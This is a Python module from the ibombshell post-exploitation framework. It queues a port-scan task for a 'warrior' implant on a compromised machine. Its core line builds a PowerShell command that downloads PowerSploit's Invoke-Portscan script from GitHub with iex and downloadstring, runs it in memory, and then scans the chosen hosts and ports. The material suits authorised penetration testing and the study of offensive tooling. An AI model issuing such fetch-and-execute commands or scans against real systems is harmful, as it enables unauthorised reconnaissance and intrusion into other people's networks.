from module import Module
from termcolor import colored, cprint
from warrior_check import exist_warrior

class CustomModule(Module):
    def __init__(self):

        information = {"Name": "Portscan",
                       "Description": "Portscan for ibombshell",
                       "Author": "Rich Lundeen",
                       "Link": "https://github.com/PowerShellMafia/PowerSploit",
                       "License": "BSD 3-Clause",
                       "Module": "@pablogonzalezpe, @toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "hosts": ["127.0.0.1", "Hosts to scan", True],
                   "port": ["20-500", "Ports to scan", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')"
            function += 'Invoke-Portscan -Hosts {} -ports {}'.format(self.args["hosts"], self.args["port"])

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')